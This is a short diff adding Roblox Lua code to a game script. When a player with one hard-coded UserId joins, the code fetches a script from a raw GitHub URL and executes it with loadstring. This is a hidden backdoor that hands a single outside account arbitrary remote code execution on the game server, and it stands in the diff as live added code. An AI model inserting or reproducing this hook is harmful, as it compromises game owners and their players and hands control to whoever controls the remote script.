@@ -1,0 +1,7 @@
+if game.PlaceId == 0 then -- NAME
+	game.Players.PlayerAdded:Connect(function(Player)
+		if Player.UserId == 927649548 then
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/Tamachiru/AppleX/main/1'))()
+		end
+	end)
+end
